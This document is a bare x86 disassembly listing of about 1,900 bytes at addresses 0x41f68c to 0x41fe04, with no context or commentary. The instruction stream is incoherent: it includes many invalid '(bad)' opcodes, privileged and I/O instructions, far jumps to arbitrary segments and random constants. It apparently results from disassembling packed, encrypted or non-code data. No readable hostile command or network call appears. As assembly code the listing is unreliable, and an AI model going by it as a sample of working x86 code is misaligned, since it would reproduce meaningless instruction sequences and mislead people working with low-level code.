  41f68c:	loope  0x41f6e7
  41f68e:	inc    esi
  41f68f:	and    ecx,DWORD PTR [edi+0x66]
  41f692:	jge    0x41f644
  41f694:	mov    edi,gs
  41f696:	add    edx,DWORD PTR [eax-0x69510f17]
  41f69c:	shl    BYTE PTR [ebp-0x3e],1
  41f69f:	cmp    DWORD PTR [ecx-0x2ca0c53f],edx
  41f6a5:	jge    0x41f66b
  41f6a7:	cmp    eax,0x99e4fb56
  41f6ac:	cmp    BYTE PTR [edi+0x35],0xc7
  41f6b0:	push   es
  41f6b1:	jp     0x41f720
  41f6b3:	(bad)  
  41f6b4:	mul    DWORD PTR [ebx+eax*1]
  41f6b7:	sahf   
  41f6b8:	mov    eax,ds:0xdaafec8a
  41f6bd:	mov    cl,0xa3
  41f6bf:	inc    ebp
  41f6c0:	push   ds
  41f6c1:	pusha  
  41f6c2:	add    ebp,0xffffffe0
  41f6c5:	jnp    0x41f67c
  41f6c7:	aas    
  41f6c8:	(bad)  
  41f6c9:	(bad)  
  41f6cb:	xor    esi,DWORD PTR [esi+ebp*8]
  41f6ce:	mov    ecx,cr3
  41f6d1:	and    eax,0xb6796903
  41f6d6:	clc    
  41f6d7:	test   eax,0xb784d8ad
  41f6dc:	adc    dl,BYTE PTR [ebp+0x45fecf8c]
  41f6e2:	ret    
  41f6e3:	mov    ds:0xb49d9ce5,al
  41f6e8:	sti    
  41f6e9:	leave  
  41f6ea:	ficom  WORD PTR [ebx]
  41f6ec:	or     bh,BYTE PTR [ebp-0x6b]
  41f6ef:	rep lods al,BYTE PTR ds:[esi]
  41f6f1:	xor    DWORD PTR [ebx],0xffffff82
  41f6f4:	std    
  41f6f5:	mov    bl,0xee
  41f6f7:	jae    0x41f6bb
  41f6f9:	sub    al,0xb0
  41f6fb:	je     0x41f6e6
  41f6fd:	cmc    
  41f6fe:	xchg   BYTE PTR es:[edx+0xb],al
  41f702:	rcl    ah,1
  41f704:	out    0xa,al
  41f706:	lds    edi,FWORD PTR [esi-0x73]
  41f709:	xchg   esi,eax
  41f70a:	ss xchg esp,eax
  41f70c:	cmp    ebp,DWORD PTR [ecx]
  41f70e:	gs (bad) 
  41f710:	retf   
  41f711:	jnp    0x41f6d2
  41f713:	lahf   
  41f714:	sahf   
  41f715:	pop    ss
  41f716:	dec    esi
  41f717:	imul   BYTE PTR [edi+eax*1-0x2b]
  41f71b:	xchg   esp,eax
  41f71c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f71d:	out    dx,al
  41f71e:	jecxz  0x41f6cd
  41f720:	jecxz  0x41f79d
  41f722:	mov    dh,0xcc
  41f724:	mov    bl,0x43
  41f726:	mov    bh,0xa2
  41f728:	add    BYTE PTR [ebx-0x6b586487],al
  41f72e:	pusha  
  41f72f:	in     al,dx
  41f730:	sahf   
  41f731:	in     eax,dx
  41f732:	add    eax,0xff587f30
  41f737:	push   eax
  41f738:	es es adc ebx,eax
  41f73c:	adc    DWORD PTR [ebx+edx*4+0x5e],esp
  41f740:	push   ebp
  41f741:	xchg   ebp,ebx
  41f743:	dec    edi
  41f744:	shr    BYTE PTR [si+0x22c5],cl
  41f749:	(bad)  
  41f74a:	cli    
  41f74b:	sbb    eax,0x8affb8ce
  41f750:	sub    cl,BYTE PTR [eax]
  41f752:	imul   edx,DWORD PTR [ebx],0x180fd83d
  41f758:	ficomp WORD PTR [ecx-0x34]
  41f75b:	in     eax,0x33
  41f75d:	adc    dl,BYTE PTR [edx+0x1825a3dc]
  41f763:	nop
  41f764:	cli    
  41f765:	ret    0x54c9
  41f768:	sbb    al,0xf3
  41f76a:	pop    ecx
  41f76b:	loop   0x41f790
  41f76d:	or     al,0xfa
  41f76f:	sbb    ebx,DWORD PTR [eax+ebp*2+0x19]
  41f773:	test   DWORD PTR [eax+0x25e1084b],ebx
  41f779:	iret   
  41f77a:	mov    dl,0xef
  41f77c:	jl     0x41f7b8
  41f77e:	pop    ecx
  41f77f:	out    0x44,eax
  41f781:	leave  
  41f782:	loop   0x41f7d1
  41f784:	lea    ebp,[edi-0x45d74108]
  41f78a:	push   esi
  41f78b:	cwde   
  41f78c:	lods   eax,DWORD PTR ds:[esi]
  41f78d:	mov    ds:0x5a5744f9,eax
  41f792:	mov    dl,0xb9
  41f794:	inc    ebx
  41f795:	add    eax,0x78b588d9
  41f79a:	sete   bh
  41f79d:	mov    eax,0xc9a917c6
  41f7a2:	mov    al,BYTE PTR [esp+eiz*8]
  41f7a5:	ret    
  41f7a6:	mov    ebp,DWORD PTR ds:[ecx]
  41f7a9:	sub    ch,BYTE PTR [ebp+0x37d9b345]
  41f7af:	sbb    BYTE PTR [ebx+0x2a205953],al
  41f7b5:	or     eax,0x9f1474a9
  41f7ba:	cdq    
  41f7bb:	sbb    edx,edx
  41f7bd:	mov    cl,0x7e
  41f7bf:	cdq    
  41f7c0:	mov    ds:0xc7405011,eax
  41f7c5:	lock fmul DWORD PTR [eax]
  41f7c8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f7c9:	xlat   BYTE PTR ds:[ebx]
  41f7ca:	xchg   esi,eax
  41f7cb:	shl    cl,0x0
  41f7ce:	test   DWORD PTR [eax+edx*1+0x6a],esp
  41f7d2:	sbb    dh,bl
  41f7d4:	lahf   
  41f7d5:	inc    ebp
  41f7d6:	jnp    0x41f7db
  41f7d8:	xchg   ecx,eax
  41f7d9:	xchg   esi,eax
  41f7da:	stos   BYTE PTR es:[edi],al
  41f7db:	mov    edx,0x1e12e2fb
  41f7e0:	gs add eax,0x73618103
  41f7e6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f7e7:	mov    esp,?
  41f7e9:	sbb    BYTE PTR [ebp+0x2c],ch
  41f7ec:	push   ecx
  41f7ed:	and    DWORD PTR [esi],ebx
  41f7ef:	mov    BYTE PTR [edi-0x56499481],bl
  41f7f5:	push   edi
  41f7f6:	in     eax,dx
  41f7f7:	push   0xffffffe4
  41f7f9:	push   0x1ed307ac
  41f7fe:	push   ss
  41f7ff:	push   cs
  41f800:	xchg   ebp,eax
  41f801:	push   cs
  41f802:	test   al,0xda
  41f804:	or     BYTE PTR [ebx+eax*1+0x66],0x7a
  41f809:	sub    al,0xc6
  41f80b:	pop    edi
  41f80c:	or     al,cl
  41f80e:	pop    esp
  41f80f:	mov    ebp,0x2509f24
  41f814:	jns    0x41f858
  41f816:	mov    ebp,0xa3426b32
  41f81b:	mov    cl,0x7
  41f81d:	pop    edx
  41f81e:	sub    al,0xae
  41f820:	mov    ecx,0x8a559081
  41f825:	mov    edx,0x4dce8abb
  41f82a:	out    dx,al
  41f82b:	jmp    0x877be775
  41f830:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f831:	xchg   esi,eax
  41f832:	mov    cl,0x4c
  41f834:	xchg   ebp,eax
  41f835:	mov    al,0xac
  41f837:	pop    esi
  41f838:	imul   ebx,DWORD PTR [eax+0x73bc1bf5],0x5decc1d4
  41f842:	cdq    
  41f843:	inc    eax
  41f844:	test   al,0x51
  41f846:	jmp    0x41f888
  41f848:	and    esi,DWORD PTR fs:[esi+0x25037944]
  41f84f:	nop
  41f850:	xchg   ebx,eax
  41f851:	sub    esp,DWORD PTR [ebx+0x37]
  41f854:	(bad)  
  41f855:	popa   
  41f856:	jmp    FWORD PTR [ebx-0x3be9be9b]
  41f85c:	stc    
  41f85d:	es cmp al,0xa6
  41f860:	loop   0x41f80c
  41f862:	and    bl,ah
  41f864:	mov    edx,0xcef4f500
  41f869:	push   edi
  41f86a:	jns    0x41f88d
  41f86c:	popf   
  41f86d:	out    0x6c,eax
  41f86f:	in     eax,0xfb
  41f871:	inc    esi
  41f872:	jmp    0x6b258a01
  41f877:	ja     0x41f832
  41f879:	and    dh,BYTE PTR [esi]
  41f87b:	adc    DWORD PTR [ebx],ecx
  41f87d:	push   ecx
  41f87e:	in     al,dx
  41f87f:	es in  eax,dx
  41f881:	shr    DWORD PTR [esi],0xf1
  41f884:	push   cs
  41f885:	pop    eax
  41f886:	test   DWORD PTR [esi-0xc],ebx
  41f889:	mov    al,0x7d
  41f88b:	ret    
  41f88c:	stc    
  41f88d:	lock ret 0x4e51
  41f891:	outs   dx,BYTE PTR ds:[esi]
  41f892:	imul   edi,DWORD PTR [ebp+0x7618687a],0xffffff9e
  41f899:	dec    ecx
  41f89a:	jecxz  0x41f8bf
  41f89c:	shl    eax,0xd2
  41f89f:	pop    ds
  41f8a0:	xchg   edx,eax
  41f8a1:	ror    ecx,0xb0
  41f8a4:	xchg   esi,eax
  41f8a5:	ret    0x245f
  41f8a8:	mov    esp,0xd53f02c1
  41f8ad:	cmp    ch,BYTE PTR [ecx]
  41f8af:	sbb    BYTE PTR [eax+0x4e],bl
  41f8b2:	fist   DWORD PTR [edx+0x54]
  41f8b5:	stos   DWORD PTR es:[edi],eax
  41f8b6:	push   ebp
  41f8b7:	xor    eax,0x95728e5f
  41f8bc:	test   al,0xe
  41f8be:	test   BYTE PTR [esi],ah
  41f8c0:	call   0x9f05:0xa3cf2b89
  41f8c7:	imul   edi,DWORD PTR [edi],0xffffffdb
  41f8ca:	aad    0x4
  41f8cc:	adc    al,0x52
  41f8ce:	push   es
  41f8cf:	and    BYTE PTR [edi-0x20e76ae3],0xe8
  41f8d6:	popa   
  41f8d7:	(bad)  
  41f8d8:	ins    DWORD PTR es:[edi],dx
  41f8d9:	push   0x5d
  41f8db:	xor    eax,0xa07a10c
  41f8e0:	adc    eax,0x48a0733e
  41f8e5:	cmc    
  41f8e6:	mov    dh,0x7b
  41f8e8:	pop    edx
  41f8e9:	loopne 0x41f911
  41f8eb:	push   eax
  41f8ec:	mov    eax,DWORD PTR [edi+0x48]
  41f8ef:	pop    esi
  41f8f0:	pop    ss
  41f8f1:	sahf   
  41f8f2:	cli    
  41f8f3:	add    bl,ch
  41f8f5:	mov    ss,WORD PTR [esi+0x30d8de16]
  41f8fb:	in     eax,0x60
  41f8fd:	pusha  
  41f8fe:	ins    BYTE PTR es:[edi],dx
  41f8ff:	or     al,0x93
  41f901:	xchg   esi,eax
  41f902:	add    esi,DWORD PTR [edx+0x23]
  41f905:	inc    edx
  41f906:	add    eax,0xef6a5d2c
  41f90b:	sahf   
  41f90c:	mov    edi,0xc4cae92f
  41f911:	xlat   BYTE PTR ds:[ebx]
  41f912:	jo     0x41f8f9
  41f914:	xchg   ebx,eax
  41f915:	rol    DWORD PTR [ebx+0x4f5b71c7],0x1c
  41f91c:	mov    bh,0x63
  41f91e:	sar    DWORD PTR ds:0x2fb9f075,1
  41f924:	jmp    0xaf9a:0xa6ccffd0
  41f92b:	xor    dh,BYTE PTR [eax]
  41f92d:	or     DWORD PTR [ebp-0x65958f94],0xc72db8b
  41f937:	jnp    0x41f954
  41f939:	neg    DWORD PTR [ebx]
  41f93b:	(bad)  
  41f93c:	int3   
  41f93d:	clc    
  41f93e:	test   eax,0xad3d4777
  41f943:	push   edx
  41f944:	dec    ecx
  41f945:	test   esp,esp
  41f947:	jl     0x41f955
  41f949:	(bad)  
  41f94a:	jo     0x41f8f1
  41f94c:	mov    dl,0xe2
  41f94e:	or     edi,DWORD PTR [esi-0x61]
  41f951:	mov    bh,0xf5
  41f953:	inc    eax
  41f954:	rol    DWORD PTR [edx+0x10],cl
  41f957:	pop    esi
  41f958:	enter  0x6923,0x78
  41f95c:	lahf   
  41f95d:	fs (bad) 
  41f95f:	cmp    al,dl
  41f961:	fbstp  TBYTE PTR [edx+0x26]
  41f964:	fucomi st,st(2)
  41f966:	fmul   st(1),st
  41f968:	mov    al,ds:0xe39477b6
  41f96d:	push   esi
  41f96e:	sub    esi,DWORD PTR [ebp+0x4f]
  41f971:	gs jb  0x41f975
  41f974:	sub    esi,DWORD PTR [ebx-0x5ca37844]
  41f97a:	adc    DWORD PTR [ecx-0x63e65adb],0x27
  41f981:	iret   
  41f982:	shr    BYTE PTR [ebx],1
  41f984:	dec    ebx
  41f985:	nop
  41f986:	int3   
  41f987:	fsub   st,st(0)
  41f989:	inc    esp
  41f98a:	push   eax
  41f98b:	out    0xb7,eax
  41f98d:	jmp    0x41f9a6
  41f98f:	repnz add eax,0x6e6ec791
  41f995:	jmp    0xbbdb09da
  41f99a:	lods   eax,DWORD PTR ds:[esi]
  41f99b:	pushf  
  41f99c:	inc    ebx
  41f99d:	inc    esi
  41f99e:	jo     0x41f99b
  41f9a0:	sub    al,0xf0
  41f9a2:	xchg   esi,eax
  41f9a3:	addr16 pusha 
  41f9a5:	xchg   eax,esp
  41f9a7:	jnp    0x41f9b2
  41f9a9:	int3   
  41f9aa:	jmp    0xcc79d1c6
  41f9af:	mov    WORD PTR [edx],fs
  41f9b1:	inc    edx
  41f9b2:	or     BYTE PTR [esi-0x8f698f6],ah
  41f9b8:	mov    al,ds:0x9ea0d10a
  41f9bd:	mov    ecx,0x71172b4e
  41f9c2:	cmp    BYTE PTR [ebp+0x7adb895d],ah
  41f9c8:	cmp    esp,DWORD PTR [esi+eax*2+0x70bdb7d]
  41f9cf:	and    dh,BYTE PTR [edi-0x48924b2b]
  41f9d5:	mov    al,ds:0x9ef1fdee
  41f9da:	mov    eax,0xf218fbf3
  41f9df:	das    
  41f9e0:	xlat   BYTE PTR ds:[ebx]
  41f9e1:	dec    eax
  41f9e2:	jno    0x41f97d
  41f9e4:	mov    ch,0xf4
  41f9e6:	push   esp
  41f9e7:	int    0x92
  41f9e9:	or     eax,0xfff599e6
  41f9ee:	(bad)  
  41f9ef:	fisub  WORD PTR [eax+0x25f41b7a]
  41f9f5:	dec    ebp
  41f9f6:	mov    eax,0x34910518
  41f9fb:	sub    eax,0x42b30911
  41fa00:	ror    edx,1
  41fa02:	push   ecx
  41fa03:	push   ebp
  41fa04:	jnp    0x41fa0e
  41fa06:	mov    ebp,0xa8eadb73
  41fa0b:	in     eax,dx
  41fa0c:	sbb    esi,0xfffffffe
  41fa0f:	jns    0x41f9d4
  41fa11:	out    dx,al
  41fa12:	add    DWORD PTR [edi+0x523427e2],esi
  41fa18:	xchg   edx,eax
  41fa19:	dec    eax
  41fa1a:	xchg   ebx,esp
  41fa1c:	repnz retf 0x87f1
  41fa20:	and    cl,BYTE PTR [ecx+0x65cccbb1]
  41fa26:	pushf  
  41fa27:	or     BYTE PTR ds:0xb8dd8527,bh
  41fa2d:	dec    esp
  41fa2e:	es ror dl,0xc1
  41fa32:	in     eax,dx
  41fa33:	or     DWORD PTR [ecx+0x51],ebx
  41fa36:	push   0x5b
  41fa38:	jae    0x41fa15
  41fa3a:	xlat   BYTE PTR ds:[ebx]
  41fa3b:	and    esi,ebp
  41fa3d:	push   es
  41fa3e:	lods   al,BYTE PTR ds:[esi]
  41fa3f:	jae    0x41fa0f
  41fa41:	ds jmp 0x41fa6d
  41fa44:	add    BYTE PTR [eax],ch
  41fa46:	in     al,dx
  41fa47:	int    0x84
  41fa49:	fidiv  DWORD PTR [edx-0x9b8ee75]
  41fa4f:	and    eax,0xc72aadce
  41fa54:	cmp    BYTE PTR [ebp+0x5b5dce75],ah
  41fa5a:	push   0x98ded247
  41fa5f:	jns    0x41fa0d
  41fa61:	pop    ecx
  41fa62:	sbb    DWORD PTR [ebp+0x18db9b69],edi
  41fa68:	das    
  41fa69:	retf   
  41fa6a:	sbb    BYTE PTR [ebp+0xdf5f895],0x71
  41fa71:	cmp    dh,BYTE PTR [esp+0x4d]
  41fa75:	enter  0x2064,0xaf
  41fa79:	shr    DWORD PTR [ebp-0x1a],0x66
  41fa7d:	adc    BYTE PTR [eax],ah
  41fa7f:	sti    
  41fa80:	shl    dh,1
  41fa82:	jne    0x41fb02
  41fa84:	stos   DWORD PTR es:[edi],eax
  41fa85:	in     eax,dx
  41fa86:	sub    DWORD PTR [eax-0x18],0x9fabce2a
  41fa8d:	sbb    DWORD PTR [edx+0xa814925],esp
  41fa93:	ror    BYTE PTR [ebp+0xe720065],1
  41fa99:	dec    eax
  41fa9a:	push   esi
  41fa9b:	dec    ebp
  41fa9c:	pusha  
  41fa9d:	add    al,0x2f
  41fa9f:	sub    eax,0x2e3ceb2a
  41faa4:	mov    ah,0x76
  41faa6:	dec    ecx
  41faa7:	dec    ecx
  41faa8:	in     al,dx
  41faa9:	neg    DWORD PTR [eax+edx*2-0x67e884ac]
  41fab0:	mov    cl,BYTE PTR [edi+0x750b2669]
  41fab6:	push   0x7b
  41fab8:	gs in  eax,0x2f
  41fabb:	jmp    0x41face
  41fabd:	push   0x12
  41fabf:	mov    esp,0xcda0574f
  41fac4:	and    eax,0x1e4802ab
  41fac9:	xor    bl,ah
  41facb:	in     al,dx
  41facc:	ins    BYTE PTR es:[edi],dx
  41facd:	lods   al,BYTE PTR ds:[esi]
  41face:	aad    0x6d
  41fad0:	cmp    eax,DWORD PTR [ebp-0x1b743716]
  41fad6:	push   ds
  41fad7:	or     al,0xf6
  41fad9:	xchg   ebx,eax
  41fada:	aam    0x77
  41fadc:	aam    0x3d
  41fade:	nop
  41fadf:	jno    0x41fb2e
  41fae1:	(bad)  
  41fae2:	mov    al,0xe
  41fae4:	inc    ecx
  41fae5:	jmp    FWORD PTR [esi-0x67cdc63d]
  41faeb:	idiv   eax
  41faed:	mov    ds:0xb0606b2f,al
  41faf2:	sbb    al,0x1d
  41faf4:	lods   al,BYTE PTR ds:[esi]
  41faf5:	es and eax,0x621cabbf
  41fafb:	ins    BYTE PTR es:[edi],dx
  41fafc:	cmp    ebx,edx
  41fafe:	or     DWORD PTR [ecx-0x2d],ebp
  41fb01:	call   0xb3e80ee3
  41fb06:	cmp    BYTE PTR ds:0x24b2ce15,bh
  41fb0c:	rcl    DWORD PTR [ebx-0x22],0x14
  41fb10:	ja     0x41fb7b
  41fb12:	push   esp
  41fb13:	out    dx,al
  41fb14:	jb     0x41fb0f
  41fb16:	fsub   QWORD PTR [esp+ebx*2+0x9534960]
  41fb1d:	lds    edi,FWORD PTR [ebx+0x10ecc7dd]
  41fb23:	(bad)  
  41fb24:	cld    
  41fb25:	fadd   QWORD PTR [esi]
  41fb27:	cwde   
  41fb28:	sub    eax,0xdc9b7686
  41fb2d:	push   es
  41fb2e:	jecxz  0x41fb6f
  41fb30:	mov    BYTE PTR [edi],ch
  41fb32:	in     al,0xb2
  41fb34:	dec    esi
  41fb35:	or     al,dl
  41fb37:	adc    eax,ebp
  41fb39:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fb3a:	adc    eax,0x1d8f84e4
  41fb3f:	int3   
  41fb40:	sub    eax,0x2c538b07
  41fb45:	fnsave [ecx-0x4b1be700]
  41fb4b:	aad    0xf0
  41fb4d:	clc    
  41fb4e:	xor    al,0xd7
  41fb50:	dec    BYTE PTR [eax]
  41fb52:	add    ebp,ebx
  41fb54:	xchg   BYTE PTR [edx-0x7fe954c0],dh
  41fb5a:	retf   
  41fb5b:	ins    BYTE PTR es:[edi],dx
  41fb5c:	idiv   BYTE PTR [edi]
  41fb5e:	cs inc esi
  41fb60:	push   ebx
  41fb61:	push   cs
  41fb62:	in     eax,dx
  41fb63:	shl    DWORD PTR [eax+0x7006ef69],cl
  41fb69:	push   ecx
  41fb6a:	lock jae 0x41fb0a
  41fb6d:	nop
  41fb6e:	xchg   esi,eax
  41fb6f:	sub    eax,0x555bc836
  41fb74:	ins    DWORD PTR es:[edi],dx
  41fb75:	stc    
  41fb76:	lds    ebx,FWORD PTR [ecx+0xe8cc13a]
  41fb7c:	cs pop ds
  41fb7e:	dec    eax
  41fb7f:	jb     0x41fb4a
  41fb81:	fist   DWORD PTR [ecx+0x5fdcc1e1]
  41fb87:	retf   
  41fb88:	mov    ebx,0x9dcba709
  41fb8d:	je     0x41fbca
  41fb8f:	call   0x1829e845
  41fb94:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fb95:	shl    cl,cl
  41fb97:	mov    cl,0x5c
  41fb99:	in     al,dx
  41fb9a:	mov    ds:0x70f23b7,al
  41fb9f:	add    bl,BYTE PTR [ebx-0x1b2be829]
  41fba5:	sbb    al,0xa2
  41fba7:	cs xchg edi,eax
  41fba9:	lea    esp,[ebp+0x43]
  41fbac:	pop    ecx
  41fbad:	out    dx,al
  41fbae:	stos   DWORD PTR es:[edi],eax
  41fbaf:	imul   esp,DWORD PTR [ecx+esi*4+0x488a3251],0xa47b3d8e
  41fbba:	mov    ebx,0x19f4c678
  41fbbf:	pop    edx
  41fbc0:	jmp    0x5c6fd909
  41fbc5:	and    bl,BYTE PTR [ecx-0x1b]
  41fbc8:	xchg   esi,eax
  41fbc9:	pop    esi
  41fbca:	outs   dx,BYTE PTR ds:[esi]
  41fbcb:	mov    ds:0xaf36f4e1,eax
  41fbd0:	cmp    edi,ebp
  41fbd2:	add    edi,ebp
  41fbd4:	cld    
  41fbd5:	jg     0x41fc25
  41fbd7:	cmp    DWORD PTR [ecx-0x78],0xf6bb0ad2
  41fbde:	into   
  41fbdf:	pop    ebx
  41fbe0:	xchg   edx,esp
  41fbe2:	pop    ecx
  41fbe3:	push   eax
  41fbe4:	loopne 0x41fb99
  41fbe6:	add    BYTE PTR [edi+0xa12cec8],al
  41fbec:	adc    ebp,DWORD PTR [esi]
  41fbee:	(bad)  
  41fbef:	jns    0x41fc6c
  41fbf1:	pop    edx
  41fbf2:	adc    DWORD PTR [edx+0x3b],esp
  41fbf5:	into   
  41fbf6:	mov    esi,0xedbe5dfb
  41fbfb:	xor    ah,bh
  41fbfd:	rcl    al,cl
  41fbff:	add    al,BYTE PTR [esi-0x79]
  41fc02:	rol    DWORD PTR ds:0xe3c04bc6,1
  41fc08:	add    esi,ebx
  41fc0a:	xor    eax,0x5bba3175
  41fc0f:	icebp  
  41fc10:	pop    edx
  41fc11:	sbb    eax,0x1980f870
  41fc16:	ds dec ebp
  41fc18:	xor    al,0x3a
  41fc1a:	jmp    0x41fc69
  41fc1c:	clc    
  41fc1d:	mov    esp,0x4f1cd007
  41fc22:	fimul  DWORD PTR [ecx+edi*4+0x7]
  41fc26:	fst    DWORD PTR [ebx-0x5a]
  41fc29:	mov    esp,eax
  41fc2b:	push   ds
  41fc2c:	pop    ds
  41fc2d:	push   edi
  41fc2e:	xchg   BYTE PTR [edi+0x61],al
  41fc31:	sub    DWORD PTR [edx+0x8],esp
  41fc34:	mov    ecx,0xd1d385e6
  41fc39:	adc    al,0xbd
  41fc3b:	fwait
  41fc3c:	call   0x8ad:0x6854524f
  41fc43:	mov    bh,0xea
  41fc45:	aaa    
  41fc46:	data16 (bad) 
  41fc48:	hlt    
  41fc49:	lea    ebp,[ecx-0x16]
  41fc4c:	inc    eax
  41fc4d:	jl     0x41fbd2
  41fc4f:	fdivr  QWORD PTR [esi+0x1d]
  41fc52:	cmp    al,0x72
  41fc54:	pop    edi
  41fc55:	mov    esp,0x4041f6bc
  41fc5a:	sub    BYTE PTR [ecx-0x24],bl
  41fc5d:	jbe    0x41fc9f
  41fc5f:	sbb    al,0x4a
  41fc61:	pop    ecx
  41fc62:	mov    al,0xa5
  41fc64:	retf   0xd80d
  41fc67:	xchg   esp,eax
  41fc68:	jmp    0x123f:0x15f1586
  41fc6f:	xchg   esp,eax
  41fc70:	shl    ebx,cl
  41fc72:	cs lods al,BYTE PTR es:[esi]
  41fc75:	ds cmp al,0xe6
  41fc78:	mov    eax,ds:0xbc2b15e8
  41fc7d:	call   0x1d4:0x5baab38a
  41fc84:	xor    eax,0xc2698fdb
  41fc89:	leave  
  41fc8a:	inc    ecx
  41fc8b:	jae    0x41fccb
  41fc8d:	mov    edx,0xc391504c
  41fc92:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fc93:	out    dx,al
  41fc94:	inc    esp
  41fc95:	lds    ecx,FWORD PTR ds:0xd4714938
  41fc9b:	fisttp DWORD PTR [edx-0x26]
  41fc9e:	(bad)  
  41fc9f:	xacquire xchg BYTE PTR [edx+ecx*4+0x2c0e87bb],ah
  41fca7:	pop    ebp
  41fca8:	inc    esp
  41fca9:	fcomp  st(7)
  41fcab:	sub    dl,BYTE PTR [edx+0x414d7dc9]
  41fcb1:	jmp    0x6f476445
  41fcb6:	or     al,0x99
  41fcb8:	jnp    0x41fcc7
  41fcba:	jns    0x41fcb8
  41fcbc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fcbd:	inc    eax
  41fcbe:	dec    edx
  41fcbf:	dec    ebp
  41fcc0:	xor    edx,edx
  41fcc2:	dec    ebp
  41fcc3:	pop    esp
  41fcc4:	xchg   esp,eax
  41fcc5:	(bad)  
  41fcc6:	nop
  41fcc7:	fst    DWORD PTR [edi]
  41fcc9:	add    al,0xf5
  41fccb:	mov    al,0x66
  41fccd:	ficomp DWORD PTR ds:0xff049e8c
  41fcd3:	icebp  
  41fcd4:	sub    al,0xa0
  41fcd6:	fidivr WORD PTR [edi+0x37c0594a]
  41fcdc:	fadd   DWORD PTR [ecx-0x6f]
  41fcdf:	inc    edx
  41fce0:	mov    ebp,0xa4ecb53b
  41fce5:	div    ch
  41fce7:	jb     0x41fc6e
  41fce9:	sub    dl,BYTE PTR [edi+0x63]
  41fcec:	loope  0x41fc73
  41fcee:	xchg   BYTE PTR [eax-0x64],dl
  41fcf1:	cmp    DWORD PTR [eax+0x41],ebp
  41fcf4:	std    
  41fcf5:	popa   
  41fcf6:	mov    ebp,0xcb9ae8cf
  41fcfb:	mov    edx,0x9256f500
  41fd00:	fistp  QWORD PTR ds:0xcb869489
  41fd06:	ins    BYTE PTR es:[edi],dx
  41fd07:	push   edi
  41fd08:	popf   
  41fd09:	fiadd  WORD PTR [ebx]
  41fd0b:	jmp    0x528d:0xfe2ff092
  41fd12:	pop    es
  41fd13:	and    BYTE PTR [eax+edi*4+0x4d8dfaaa],bl
  41fd1a:	hlt    
  41fd1b:	dec    ecx
  41fd1c:	in     eax,dx
  41fd1d:	inc    ebx
  41fd1e:	inc    esp
  41fd1f:	mov    bh,0x80
  41fd21:	lahf   
  41fd22:	fbld   TBYTE PTR [ebx+0x695794d9]
  41fd28:	cmp    cl,BYTE PTR ss:[esi]
  41fd2b:	aam    0xb4
  41fd2d:	pushf  
  41fd2e:	pop    es
  41fd2f:	mov    ebx,DWORD PTR ds:0x15d70ead
  41fd35:	scas   eax,DWORD PTR es:[edi]
  41fd36:	pop    edx
  41fd37:	arpl   sp,ax
  41fd39:	loop   0x41fd5f
  41fd3b:	push   ebp
  41fd3c:	(bad)  
  41fd3d:	outs   dx,DWORD PTR ds:[esi]
  41fd3e:	pop    esp
  41fd3f:	call   0x5f83:0x12d361dd
  41fd46:	sub    BYTE PTR [ecx-0xd8781f7],dl
  41fd4c:	sbb    BYTE PTR [edi-0x34],al
  41fd4f:	xor    eax,ebp
  41fd51:	sub    BYTE PTR ds:0x70aa01f6,dl
  41fd57:	dec    edi
  41fd58:	je     0x41fd16
  41fd5a:	clc    
  41fd5b:	jo     0x41fdd6
  41fd5d:	sti    
  41fd5e:	mov    eax,ds:0xf9efb64f
  41fd63:	cmp    dh,BYTE PTR [ecx+ecx*1-0x2d]
  41fd67:	idiv   BYTE PTR [eax+0x26e231f3]
  41fd6d:	loop   0x41fd16
  41fd6f:	sbb    BYTE PTR ds:0xfac1776d,0x8c
  41fd76:	dec    ebx
  41fd77:	ss pop es
  41fd79:	test   dl,0xf1
  41fd7c:	out    0xd9,al
  41fd7e:	pop    esp
  41fd7f:	daa    
  41fd80:	ret    
  41fd81:	sbb    bh,BYTE PTR [eax+edx*1]
  41fd84:	push   esi
  41fd85:	repnz pop esi
  41fd87:	mov    ds:0x85546d07,eax
  41fd8c:	in     al,dx
  41fd8d:	mov    cl,0x2e
  41fd8f:	mov    DWORD PTR [ebx+0x40],ecx
  41fd92:	adc    BYTE PTR [ecx],ah
  41fd94:	sbb    ebp,DWORD PTR ds:0x55f374eb
  41fd9a:	adc    BYTE PTR [ecx+edi*8],0x22
  41fd9e:	test   BYTE PTR [ebp-0x303dc1fd],ch
  41fda4:	pop    ecx
  41fda5:	arpl   WORD PTR [esi+0x51],sp
  41fda8:	push   edi
  41fda9:	ja     0x41fdee
  41fdab:	cmc    
  41fdac:	call   FWORD PTR [edx]
  41fdae:	in     eax,dx
  41fdaf:	dec    esi
  41fdb0:	outs   dx,DWORD PTR ds:[esi]
  41fdb1:	jg     0x41fd8a
  41fdb3:	out    0xaa,al
  41fdb5:	test   BYTE PTR [esi],dl
  41fdb7:	jmp    0x9d95:0x752648b
  41fdbe:	neg    DWORD PTR [esi-0x33]
  41fdc1:	shl    BYTE PTR [ebx+eax*1],1
  41fdc4:	mov    ah,0x62
  41fdc6:	adc    dl,cl
  41fdc8:	sub    ecx,DWORD PTR [esi+0xd2fad14]
  41fdce:	sbb    cl,BYTE PTR [ecx]
  41fdd0:	int    0xb3
  41fdd2:	and    cl,BYTE PTR [esi]
  41fdd4:	pop    ecx
  41fdd5:	inc    eax
  41fdd6:	loopne 0x41fdfe
  41fdd8:	scas   eax,DWORD PTR es:[edi]
  41fdd9:	sbb    al,BYTE PTR [ebx-0x4c8c2a7e]
  41fddf:	mov    al,ds:0xf59aed8f
  41fde4:	ins    DWORD PTR es:[edi],dx
  41fde5:	out    dx,al
  41fde6:	push   ebp
  41fde7:	xchg   al,bh
  41fde9:	pop    esi
  41fdea:	and    ebp,DWORD PTR [eax-0x17daad13]
  41fdf0:	sbb    dl,BYTE PTR [esi]
  41fdf2:	loop   0x41fe41
  41fdf4:	stos   DWORD PTR es:[edi],eax
  41fdf5:	or     esp,DWORD PTR [edx]
  41fdf7:	cld    
  41fdf8:	and    BYTE PTR [ebx+0x40],dl
  41fdfb:	jns    0x41fdca
  41fdfd:	or     eax,eax
  41fdff:	mov    bh,0x30
  41fe01:	inc    ebp
  41fe02:	or     al,0x8c
  41fe04:	pop    ebx
